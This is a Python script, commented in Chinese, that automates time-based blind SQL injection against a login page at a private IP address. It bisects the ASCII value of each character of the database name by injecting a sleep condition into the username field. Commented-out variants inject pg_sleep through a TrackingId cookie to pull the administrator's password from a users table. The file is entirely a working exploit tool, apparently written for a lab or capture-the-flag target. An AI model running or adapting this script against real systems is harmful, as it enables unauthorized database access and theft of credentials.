# 利用二分法进行时间盲注
import requests
import time

url = "http://10.1.100.50:8081/login.php"

result = ""
sleepTime = 1
normalResponseTime = 0
signForError = False
from_asc = 10
to_asc = 130


s = requests.session()
flag = ""
for i in range(1, 100):
    l = from_asc
    r = to_asc
    mid = (l + r) >> 1  # 整除2
    while l < r:
        selection = "SELECT string_agg(password,',') FROM users WHERE username = 'administrator'"

        # payload = f"select case when (ascii(substr(({selection}),{i},1))>{mid}) then pg_sleep({sleepTime}) else pg_sleep(0) end"

        payload = f"ascii(right(left(database(),{i}),1))>{mid}"
        # 检查payload括号是否闭合
        if payload.count("(") != payload.count(")"):
            print("括号不闭合")
            exit()
        print(payload, end=" ")
        # headers = {
        #     "Cookie": f"TrackingId=o49yYm5ROxYVAnPl'%3B{payload}||'; session=CyFvwn6eJc4W3935PXbElLyLPDs9B6Aq"
        # }
        # 开始计时
        data = {
            "login791": "Login",
            "password": "123",
            "username": f"admin' and if({payload},sleep(1),1) or '1'='1",
        }

        start = time.time()
        # 设置超时时间10秒
        response = s.post(url=url, data=data, timeout=5)
        # 结束计时
        end = time.time()
        interval = end - start
        print(interval, end=" ")
        if interval > sleepTime + normalResponseTime:
            l = mid + 1
            print("true")
        else:
            r = mid
            print("false")
        mid = (l + r) >> 1
    if mid == from_asc or mid == to_asc:
        print("未匹配字符，是否继续爆破下一个字符？(y/n)")
        condition = input()
        if condition == "y" or condition == "Y":
            ...
        elif condition == "n" or condition == "N":
            break
    print(chr(mid))
    result = result + chr(mid)
    print(result)
print(result)
